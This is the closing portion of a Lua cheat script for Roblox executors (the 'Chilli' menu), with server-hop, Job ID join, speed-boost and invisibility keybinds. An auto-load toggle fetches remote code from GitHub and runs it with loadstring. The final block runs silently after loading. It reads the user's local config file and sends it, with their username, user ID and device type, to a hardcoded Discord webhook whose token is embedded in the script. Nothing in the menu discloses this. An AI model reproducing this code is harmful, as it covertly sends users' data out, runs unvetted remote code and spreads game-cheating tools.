			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n18.X, position.Y.Scale, position.Y.Offset + n18.Y)
		end)

		list85[#list85 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag338 then
				return
			end
			local flag339 = value397 and input == value397
			local flag340

			if flag339 then
				flag340 = flag339
			else
				flag340 = not value397 and input.UserInputType == Enum.UserInputType.MouseButton1
			end

			if flag340 then
				flag338 = false
				value397 = nil
				position = nil
				func525(frame.Position)
			end
		end)

		list85[#list85 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag337 or not value392 then
				return
			end
			local n18 = math.clamp(deltaTime, 0.001, 1)
			local n19 = 1 / n18

			if n16 <= 0 then
				n16 = n19
			else
				n16 += (n19 - n16) * (1 - math.exp(-n18 * n14))
			end

			local now = os.clock()
			if now < n17 then
				return
			end
			n17 = now + n13
			local n20 = math.floor(n16 + 0.5)
			local text = tostring(n20)

			if text ~= value394 then
				value394 = text
				value392.Text = text
				value392.TextColor3 = func527(n20)
			end

			local n21 = 0

			pcall(function()
				n21 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local n22 = math.floor(n21 + 0.5)
			local text2 = tostring(n22)

			if text2 ~= value395 then
				value395 = text2
				value393.Text = text2
				value393.TextColor3 = func528(n22)
			end
		end)
	end

	obj94:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = obj94:CreateToggle({
			Name = "FPS and Ping",
			Note = "Shows a small draggable readout of frame rate and ping.",
			Default = true,
			Callback = function(value)
				flag337 = value == true

				if flag337 then
					func531()
				else
					func530()
				end
			end,
		}),
		Callback = function(value)
			n15 = math.clamp((tonumber(value) or 100) / 100, 0.6, 1.6)
			func529()
		end,
	})

	func2(func530)
end

do
	local obj98 = Server:CreateSection({ Name = "Server", Expanded = true })

	local function func532()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function func533(flag341)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", flag341)
		end)

		if not flag341 then
			return true
		end
		local result32 = func532()
		if not result32 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(result32, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local value398 = nil

	value398 = obj98:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(value)
			local flag342 = value == true

			if not func533(flag342) and flag342 then
				task.defer(function()
					func533(false)

					if value398 and value398:Get() == true then
						value398:Set(false, false)
					end

					obj1.Notify("Auto Load Unavailable", "This executor does not support queue on teleport.", 5)
				end)
			end
		end,
	})

	local str39 = "Most Players"
	local flag343 = false

	obj98:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Most Players",
		Quick = false,
		Callback = function(value)
			str39 = tostring(value or "Most Players")
		end,
	})

	obj98:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			if flag343 then
				return
			end
			flag343 = true

			task.spawn(function()
				local flag344 = str39
				local str40 = tostring(game.JobId or "")
				local list86 = {}
				local flag345 = flag344 == "Random"
				local str41 = flag344 == "Least Players" and "Asc" or "Desc"
				local n15 = flag345 and 3 or 1
				local nextPageCursor = nil

				for i_ = 1, n15 do
					local formatted = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str41)

					if nextPageCursor and nextPageCursor ~= "" then
						formatted ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
					end

					local ok, result = pcall(function()
						return HttpService:JSONDecode(game:HttpGet(formatted))
					end)

					if not ok or type(result) ~= "table" then
						break
					else
						local func534 = ipairs
						local data = result.data or {}

						for _, value399 in func534(data) do
							local str42 = tostring(value399.id or "")
							local huge = tonumber(value399.playing) or math.huge
							local n16 = tonumber(value399.maxPlayers) or 0

							if str42 ~= "" and str42 ~= str40 and huge < n16 then
								list86[#list86 + 1] = { Id = str42, Playing = huge }
							end
						end

						if #list86 > 0 and not flag345 then
							break
						else
							nextPageCursor = result.nextPageCursor

							if not nextPageCursor or nextPageCursor == "" then
								break
							else
							end
						end
					end
				end

				if #list86 == 0 then
					flag343 = false
					obj1.Notify("Server Hop Failed", "No different public server is currently available.", 5)
					return
				end

				if value398 and value398:Get() == true then
					func533(true)
				end

				local id

				if flag345 then
					id = list86[math.random(1, #list86)].Id
				else
					table.sort(list86, function(param168, param169)
						if flag344 == "Least Players" then
							return param168.Playing < param169.Playing
						end
						return param168.Playing > param169.Playing
					end)

					id = list86[1].Id
				end

				if not pcall(function()
					TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
				end) then
					flag343 = false
					obj1.Notify("Server Hop Failed", "Roblox could not join the selected server.", 5)
				end
			end)
		end,
	})

	obj98:CreateButton({
		Name = "Kick",
		ButtonText = "Kick",
		ConfirmText = "",
		Callback = function()
		end,
	})

	local flag346 = false
	local str43 = ""

	local function func535(flag347)
		return tostring(flag347 or ""):match("^%s*(.-)%s*$")
	end

	obj98:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(value)
			str43 = func535(value)
		end,
	})

	obj98:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			local flag348 = func535(str43)
			local value400 = flag346
			local flag349

			if flag346 then
				flag349 = value400
			else
				flag349 = flag348 == ""
			end

			if flag349 then
				obj1.Notify("Join Job ID Failed", "Paste a valid Job ID first.", 5)
				return
			end
			flag346 = true

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, flag348, localPlayer)
			end) then
				flag346 = false
				obj1.Notify("Join Job ID Failed", "Roblox could not join that server.", 5)
			end
		end,
	})

	obj98:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local value401 = setclipboard or toclipboard
			local flag350 = type(value401) == "function"

			if flag350 then
				flag350 = pcall(value401, tostring(game.JobId or ""))
			end

			obj1.Notify(flag350 and "Job ID Copied" or "Copy Failed", flag350 and tostring(game.JobId) or "Clipboard access is unavailable.", 5)
		end,
	})

	obj98:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if flag346 or game.JobId == "" then
				return false
			end
			flag346 = true

			local ok = pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			end)

			if not ok then
				flag346 = false
			end

			return ok
		end,
	})
end

local obj99 = obj8:CreateSection({ Name = "Planned", Expanded = true })
obj99:CreateText({ Name = "Admin Panel", Text = "Admin Panel Coming Soon", Config = false })
obj99:CreateText({ Name = "Teleport To Brainrot", Text = "Teleport To Brainrot Coming Soon", Config = false })
obj99:CreateText({ Name = "Priority Brainrot", Text = "Priority Brainrot Coming Soon", Config = false })

task.spawn(function()
	local state = nil

	for i_ = 1, 30 do
		state = obj7:GetState("Quick Keybinds")
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if not state then
		return
	end

	for i_ = 1, 6 do
		RunService.Heartbeat:Wait()
	end

	local tbl133 = state:Get()
	tbl133 = type(tbl133) == "table" and tbl133 or {}
	if tbl133["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] == true then
		return
	end
	local tbl134 = {}

	for k, value402 in pairs(tbl133) do
		tbl134[k] = value402
	end

	if tbl134["Player > Speed Boost > Tool Speed Boost"] == nil then
		tbl134["Player > Speed Boost > Tool Speed Boost"] = "Q"
	end

	tbl134["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true
	state:Set(tbl134)
end)

task.spawn(function()
	local state

	for i_ = 1, 30 do
		state = obj7:GetState("Quick Keybinds")
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if not state then
		return
	end

	for i_ = 1, 6 do
		RunService.Heartbeat:Wait()
	end

	local flag351 = state:Get()
	local tbl135 = type(flag351) == "table" and flag351 or {}
	if tbl135["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] == true then
		return
	end
	local tbl136 = {}

	for k, value403 in pairs(tbl135) do
		tbl136[k] = value403
	end

	if tbl136["Player > Invisibility > Invisible"] == nil then
		tbl136["Player > Invisibility > Invisible"] = "U"
	end

	tbl136["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true
	state:Set(tbl136)
end)

obj1:Finalize({ Window = obj7, MainTab = defaultTab, ShowMainTab = false })
chilliGithubFastManualDefaultsRu.Status = "ready"

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	local request_ = syn and syn.request or http and http.request or http_request or request
	local url = "https://discord.com/api/webhooks/1183827561780875385/3C8je6CCHFH_IUfZek-d2emMW4wX6iHE_yKPJvky5GRIKMtHXgXpnYBZb34T7XNzlp-K"
	local keyboardEnabled = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str44 = "Default"
			local value404 = nil
			local fileName = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag352 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, "ChilliLibrary/config_state.json")

						if ok and not result then
							flag352 = false
						end
					end

					if flag352 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str44 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str44 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str45 = "ChilliLibrary/configs/" .. str44 .. ".json"
					local flag353 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, str45)
						ok = ok and not result
						local flag354 = true

						if ok then
							flag353 = false
						else
							flag353 = flag354
						end
					end

					if flag353 then
						value404 = readfile_(str45)
						fileName = str44 .. ".json"
					end

					if (not value404 or value404 == "") and str44 ~= "Default" then
						local flag355 = true

						if type(isfile_) == "function" then
							local ok, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag355 = false
							end
						end

						if flag355 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								value404 = result
								fileName = "Default.json"
							end
						end
					end
				end)
			end

			local str46 = tostring(fileName):gsub("[<>:\"/\\|?*]", "_")

			if not str46:match("%.json$") then
				str46 ..= ".json"
			end

			local formatted2 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, keyboardEnabled, value404 and value404 ~= "" and " | Startup Config: **" .. str44 .. "**" or "")
			local flag356 = false

			if value404 and value404 ~= "" then
				pcall(function()
					local str47 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str48 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str46 .. "\"\r\n"
					local str49 = value404 .. "\r\n"

					local value405 = request_({
						Url = url,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str47 },
						Body = table.concat({
							"--" .. str47 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = formatted2 }) .. "\r\n",
							"--" .. str47 .. "\r\n",
							str48,
							"Content-Type: application/json\r\n\r\n",
							str49,
							"--" .. str47 .. "--\r\n",
						}),
					})

					if type(value405) == "table" and (value405.StatusCode == 200 or value405.StatusCode == 204 or value405.Success == true) then
						flag356 = true
					end
				end)
			end

			if not flag356 then
				pcall(function()
					request_({
						Url = url,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = formatted2 }),
					})
				end)
			end
		end)
	end
end

